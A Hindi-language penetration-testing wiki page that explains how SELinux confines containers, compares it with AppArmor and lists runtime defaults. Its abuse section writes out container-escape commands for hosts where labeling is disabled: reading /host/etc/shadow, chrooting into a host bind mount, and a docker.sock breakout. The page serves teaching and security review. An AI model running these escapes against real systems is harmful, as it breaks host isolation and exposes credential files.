# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## अवलोकन

SELinux एक **label-based Mandatory Access Control** प्रणाली है। प्रत्येक संबंधित प्रोसेस और ऑब्जेक्ट एक सुरक्षा संदर्भ (security context) धारण कर सकता है, और नीति (policy) तय करती है कि कौन से डोमेन किन प्रकारों (types) के साथ और किस तरह इंटरैक्ट कर सकते हैं। कंटेनरीकृत वातावरणों में, इसका सामान्य अर्थ यह होता है कि runtime कंटेनर प्रोसेस को एक confined container domain के अंतर्गत लॉन्च करता है और कंटेनर सामग्री को संबंधित types के साथ लेबल करता है। यदि नीति सही ढंग से काम कर रही है, तो प्रोसेस उन चीज़ों को पढ़ने और लिखने में सक्षम होगा जिनसे उसके लेबल के छूने की उम्मीद है, जबकि अन्य होस्ट सामग्री का एक्सेस उसे रोक दिया जाएगा, भले ही वह सामग्री किसी mount के जरिए दिखाई दे।

यह मैनस्ट्रीम Linux कंटेनर तैनाती में उपलब्ध सबसे शक्तिशाली होस्ट-साइड सुरक्षा उपायों में से एक है। यह Fedora, RHEL, CentOS Stream, OpenShift, और अन्य SELinux-केंद्रित इकोसिस्टम्स पर विशेष रूप से महत्वपूर्ण है। उन परिवेशों में, जो रिव्युअर SELinux को अनदेखा करते हैं वे अक्सर यह गलत समझते हैं कि होस्ट से समझौता करने का कोई स्पष्ट दिखने वाला रास्ता असल में क्यों ब्लॉक हो रहा है।

## AppArmor बनाम SELinux

सबसे सरल हाई-लेवल अंतर यह है कि AppArmor path-based है जबकि SELinux **label-based** है। इसका container सुरक्षा पर बड़ा प्रभाव पड़ता है। एक path-based नीति अलग व्यवहार कर सकती है यदि वही होस्ट सामग्री किसी अनपेक्षित mount path के तहत दिखाई दे। एक label-based नीति इसके बजाय यह पूछती है कि ऑब्जेक्ट का लेबल क्या है और प्रोसेस डोमेन उसके साथ क्या कर सकता है। इससे SELinux सरल नहीं बनता, लेकिन यह AppArmor-आधारित सिस्टम में कभी-कभी रक्षकों द्वारा अनजाने में किए जाने वाले path-trick अनुमानों के खिलाफ इसे अधिक मजबूत बनाता है।

क्योंकि मॉडल लेबल-उन्मुख है, container volume हैंडलिंग और relabeling निर्णय security-critical होते हैं। यदि runtime या operator लेबल्स को "make mounts work" करने के लिए बहुत व्यापक रूप से बदल देता है, तो वह policy सीमा जो वर्कलोड को सीमित करने के लिए थी वह इच्छित से बहुत कमजोर हो सकती है।

## लैब

यह देखने के लिए कि SELinux होस्ट पर सक्रिय है या नहीं:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
होस्ट पर मौजूद लेबलों का निरीक्षण करने के लिए:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
एक सामान्य रन की तुलना उस रन से करने के लिए जहाँ लेबलिंग अक्षम है:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
On an SELinux-enabled host, यह एक बहुत व्यावहारिक प्रदर्शन है क्योंकि यह दिखाता है कि अपेक्षित container domain के तहत चल रहा workload और वह workload जिसमें वह enforcement layer हटा दी गई है — इन दोनों के बीच क्या अंतर है।

## रनटाइम उपयोग

Podman उन सिस्टमों पर विशेष रूप से SELinux के साथ अच्छे से मेल खाता है जहाँ SELinux प्लेटफ़ॉर्म डिफ़ॉल्ट का हिस्सा होता है। Rootless Podman और SELinux मिलकर एक सबसे मजबूत mainstream container बेसलाइन बनाते हैं क्योंकि प्रोसेस पहले से ही host पक्ष पर unprivileged होता है और फिर भी MAC policy द्वारा सीमित रहता है। Docker भी जहाँ समर्थित है SELinux का उपयोग कर सकता है, हालाँकि administrators कभी-कभी volume-labeling friction से निपटने के लिए इसे disable कर देते हैं। CRI-O और OpenShift अपने container isolation मॉडल में SELinux पर भारी निर्भर करते हैं। Kubernetes भी SELinux-संबंधित सेटिंग्स उजागर कर सकता है, लेकिन उनकी उपयोगिता इस बात पर निर्भर करती है कि node OS वास्तव में SELinux को सपोर्ट और enforce करता है या नहीं।

दोहरने वाला पाठ यही है कि SELinux कोई वैकल्पिक सजावट नहीं है। जिन इकोसिस्टम्स का निर्माण इसके आसपास हुआ है, वहाँ यह अपेक्षित सुरक्षा सीमा का हिस्सा होता है।

## गलत कॉन्फ़िगरेशन

क्लासिक गलती `label=disable` है। ऑपरेशनल रूप में, यह अक्सर इसलिए होता है क्योंकि किसी volume mount को access नहीं मिला और सबसे त्वरित अल्पकालिक जवाब SELinux को समस्या से बाहर कर देना रहा, बजाय इसके कि labeling मॉडल को ठीक किया जाए। एक और सामान्य गलती host content का गलत relabeling है। व्यापक relabel ऑपरेशंस ऐप्लिकेशन को काम करने लायक बना सकते हैं, लेकिन वे container को छूने की अनुमति देने वाली चीज़ों के दायरे को भी मूल इरादे से कहीं आगे बढ़ा सकते हैं।

यह भी महत्वपूर्ण है कि **installed** SELinux को **effective** SELinux से भ्रमित न करें। एक होस्ट SELinux को सपोर्ट कर सकता है और फिर भी permissive mode में हो सकता है, या runtime वह workload अपेक्षित domain के तहत लॉन्च नहीं कर रहा हो सकता है। ऐसे मामलों में सुरक्षा दस्तावेज़ों से बताए गए स्तर से काफी कमजोर होती है।

## दुरुपयोग

जब SELinux अनुपस्थित हो, permissive हो, या workload के लिए व्यापक रूप से disabled हो, तो host-mounted पाथ्स का दुरुपयोग करना बहुत आसान हो जाता है। वही bind mount जो सामान्यतः labels से सीमित किया जाता, वह अब host डेटा या host संशोधन तक सीधा मार्ग बन सकता है। यह विशेष रूप से तब प्रासंगिक है जब यह writable volume mounts, container runtime डायरेक्टरीज़, या ऐसे operational शॉर्टकट्स के साथ जुड़ा हो जो सुविधा के लिए संवेदनशील host पाथ्स को उजागर करते हैं।

SELinux अक्सर यह समझाता है कि क्यों एक generic breakout writeup एक होस्ट पर तुरंत काम कर जाता है पर दूसरे पर बार-बार विफल रहता है, भले ही runtime flags समान दिखें। अक्सर गायब तत्व namespace या capability नहीं होता, बल्कि एक label boundary होती है जो अक्षुण्ण बनी रहती है।

सबसे तेज़ व्यावहारिक जाँच यह है कि सक्रिय context की तुलना की जाए और फिर उन mounted host paths या runtime डायरेक्टरीज़ को probe किया जाएँ जो सामान्यतः label-confined होतीं:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
यदि एक host bind mount मौजूद है और SELinux लेबलिंग अक्षम या कमजोर की गई है, तो सूचना का खुलासा अक्सर पहले होता है:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
यदि mount लिखने योग्य है और container kernel के दृष्टिकोण से प्रभावी रूप से host-root है, तो अगला कदम अनुमान लगाने की बजाय नियंत्रित host संशोधन का परीक्षण करना है:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux-सक्षम होस्ट्स पर, रनटाइम स्टेट निर्देशिकाओं के आसपास लेबल खो जाने से सीधे privilege-escalation पथ भी उजागर हो सकते हैं:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
ये commands पूर्ण escape chain की जगह नहीं लेते, लेकिन ये बहुत जल्दी स्पष्ट कर देते हैं कि क्या SELinux वह था जो host data access या host-side file modification रोक रहा था।

### पूर्ण उदाहरण: SELinux अक्षम + लिखने योग्य होस्ट माउंट

यदि SELinux labeling अक्षम है और host filesystem `/host` पर लिखने योग्य के रूप में माउंट है, तो एक full host escape सामान्य bind-mount abuse का मामला बन जाता है:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
यदि `chroot` सफल होता है, तो कंटेनर प्रक्रिया अब होस्ट फ़ाइल सिस्टम से संचालित हो रही है:
```bash
id
hostname
cat /etc/passwd | tail
```
### पूरा उदाहरण: SELinux निष्क्रिय + Runtime Directory

यदि workload लेबल्स निष्क्रिय होने के बाद किसी runtime socket तक पहुँच सकता है, तो escape को runtime को सौंपा जा सकता है:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
प्रासंगिक अवलोकन यह है कि SELinux अक्सर ठीक इसी तरह के host-path या runtime-state access को रोकने वाला नियंत्रण होता था।

## जाँच

SELinux जाँच का उद्देश्य यह सुनिश्चित करना है कि SELinux सक्षम है, वर्तमान security context की पहचान करना, और यह देखना कि जिन files या paths की आपको परवाह है वे वास्तव में label-confined हैं या नहीं।
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
यहाँ ध्यान देने योग्य बातें:

- `getenforce` आदर्श रूप से `Enforcing` लौटाना चाहिए; `Permissive` या `Disabled` होने पर पूरे SELinux अनुभाग का अर्थ बदल जाता है।
- यदि वर्तमान प्रक्रिया संदर्भ अनपेक्षित या बहुत व्यापक दिखता है, तो वर्कलोड इच्छित कंटेनर नीति के तहत चल नहीं रहा हो सकता।
- यदि होस्ट-माउंट की गई फाइलें या रनटाइम डायरेक्टरियाँ ऐसे लेबल रखती हैं जिन्हें प्रक्रिया बहुत आसानी से एक्सेस कर सकती है, तो bind mounts और भी खतरनाक हो जाते हैं।

जब आप SELinux-सक्षम प्लेटफ़ॉर्म पर किसी container की समीक्षा कर रहे हों, तो लेबलिंग को गौण विवरण के रूप में न लें। कई मामलों में यह मुख्य कारणों में से एक होता है कि होस्ट पहले से समझौता नहीं हुआ है।

## रनटाइम डिफ़ॉल्ट

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | होस्ट-निर्भर | SELinux-enabled होस्ट पर SELinux पृथक्करण उपलब्ध होता है, लेकिन वास्तविक व्यवहार होस्ट/daemon कॉन्फ़िगरेशन पर निर्भर करता है | `--security-opt label=disable`, bind mounts का व्यापक relabeling, `--privileged` |
| Podman | SELinux होस्टों पर सामान्यतः सक्षम | जब तक निष्क्रिय न किया गया हो, SELinux सिस्टम्स पर Podman में SELinux पृथक्करण सामान्य रूप से हिस्सा होता है | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | आम तौर पर Pod स्तर पर स्वचालित रूप से असाइन नहीं किया जाता | SELinux सपोर्ट मौजूद है, लेकिन Pods को सामान्यतः `securityContext.seLinuxOptions` या प्लेटफ़ॉर्म-विशिष्ट डिफ़ॉल्ट की आवश्यकता होती है; runtime और node समर्थन भी आवश्यक हैं | कमजोर या व्यापक `seLinuxOptions`, permissive/disabled नोड्स पर चलना, प्लेटफ़ॉर्म नीतियाँ जो लेबलिंग को निष्क्रिय कर देती हैं |
| CRI-O / OpenShift style deployments | आमतौर पर व्यापक रूप से भरोसा किया जाता है | इन परिवेशों में SELinux अक्सर node isolation मॉडल का एक मूलभूत हिस्सा होता है | कस्टम नीतियाँ जो पहुँच को अत्यधिक व्यापक कर देती हैं, संगतता के लिए लेबलिंग को निष्क्रिय करना |

SELinux डिफ़ॉल्ट्स seccomp डिफ़ॉल्ट्स की तुलना में अधिक distribution-निर्भर होते हैं। Fedora/RHEL/OpenShift-शैली के सिस्टमों पर, SELinux आमतौर पर isolation मॉडल का केंद्र होता है। गैर-SELinux सिस्टमों पर यह बस अनुपस्थित होता है।
{{#include ../../../../banners/hacktricks-training.md}}
